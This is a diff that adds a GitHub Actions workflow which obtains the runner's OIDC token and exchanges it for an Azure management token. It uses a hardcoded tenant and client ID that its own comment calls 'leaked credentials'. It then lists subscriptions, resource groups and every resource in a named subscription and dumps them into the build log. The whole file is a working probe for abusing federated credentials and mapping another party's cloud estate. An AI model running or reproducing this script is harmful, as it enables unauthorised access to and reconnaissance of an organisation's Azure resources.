@@ -1,0 +1,107 @@
+name: oidc-azure-probe
+on: push
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get OIDC token and try Azure exchange
+        run: |
+          python3 - <<'PY'
+          import base64, json, os, urllib.error, urllib.parse, urllib.request
+
+          print('event:', os.getenv('GITHUB_EVENT_NAME'))
+          print('repository:', os.getenv('GITHUB_REPOSITORY'))
+
+          oidc_url = os.getenv('ACTIONS_ID_TOKEN_REQUEST_URL')
+          oidc_bearer = os.getenv('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
+          if not oidc_url or not oidc_bearer:
+              print('OIDC_UNAVAILABLE')
+              raise SystemExit(0)
+
+          separator = '&' if '?' in oidc_url else '?'
+          oidc_url += separator + 'audience=api%3A%2F%2FAzureADTokenExchange'
+          request = urllib.request.Request(
+              oidc_url, headers={'Authorization': 'Bearer ' + oidc_bearer})
+          try:
+              with urllib.request.urlopen(request, timeout=15) as response:
+                  jwt = json.load(response)['value']
+          except Exception as error:
+              print('OIDC_REQUEST_FAILED:', type(error).__name__, error)
+              raise SystemExit(0)
+
+          payload = jwt.split('.')[1]
+          payload += '=' * (-len(payload) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(payload))
+          print('OIDC_AVAILABLE')
+          print('OIDC subject:', claims.get('sub'))
+          print('OIDC audience:', claims.get('aud'))
+          print('OIDC issuer:', claims.get('iss'))
+          print('OIDC repository:', claims.get('repository'))
+          print('OIDC repository_owner:', claims.get('repository_owner'))
+
+          # Try Azure exchange with leaked credentials
+          tenant = '3205c325-06a5-4171-9ce8-ffc5e6c2845e'
+          client = '72ff278a-9e71-43ec-bac4-2ca303f8e462'
+
+          form = urllib.parse.urlencode({
+              'client_id': client,
+              'scope': 'https://management.azure.com/.default',
+              'grant_type': 'client_credentials',
+              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
+              'client_assertion': jwt,
+          }).encode()
+          request = urllib.request.Request(
+              'https://login.microsoftonline.com/' + tenant + '/oauth2/v2.0/token',
+              data=form)
+          try:
+              with urllib.request.urlopen(request, timeout=20) as response:
+                  result = json.load(response)
+          except urllib.error.HTTPError as error:
+              result = json.load(error)
+          except Exception as error:
+              print('AZURE_REQUEST_FAILED:', type(error).__name__, error)
+              raise SystemExit(0)
+
+          if 'access_token' in result:
+              print('AZURE_EXCHANGE_OK')
+              token = result['access_token']
+              # List subscriptions
+              req = urllib.request.Request(
+                  'https://management.azure.com/subscriptions?api-version=2022-12-01',
+                  headers={'Authorization': 'Bearer ' + token})
+              try:
+                  with urllib.request.urlopen(req, timeout=15) as resp:
+                      subs = json.load(resp)
+                      print('Subscriptions:', json.dumps(subs, indent=2)[:2000])
+              except Exception as e:
+                  print('List subs failed:', e)
+
+              # List resource groups in the known subscription
+              sub_id = 'c5e4e004-b42d-4ac4-a502-5fd338380eb6'
+              req = urllib.request.Request(
+                  f'https://management.azure.com/subscriptions/{sub_id}/resourcegroups?api-version=2021-04-01',
+                  headers={'Authorization': 'Bearer ' + token})
+              try:
+                  with urllib.request.urlopen(req, timeout=15) as resp:
+                      rgs = json.load(resp)
+                      print('Resource Groups:', json.dumps(rgs, indent=2)[:2000])
+              except Exception as e:
+                  print('List RGs failed:', e)
+
+              # List all resources
+              req = urllib.request.Request(
+                  f'https://management.azure.com/subscriptions/{sub_id}/resources?api-version=2021-04-01',
+                  headers={'Authorization': 'Bearer ' + token})
+              try:
+                  with urllib.request.urlopen(req, timeout=15) as resp:
+                      resources = json.load(resp)
+                      print('Resources:', json.dumps(resources, indent=2)[:5000])
+              except Exception as e:
+                  print('List resources failed:', e)
+          else:
+              print('AZURE_EXCHANGE_FAILED:', result.get('error'))
+              print('AZURE_ERROR_DESCRIPTION:', result.get('error_description', '')[:500])
+          PY
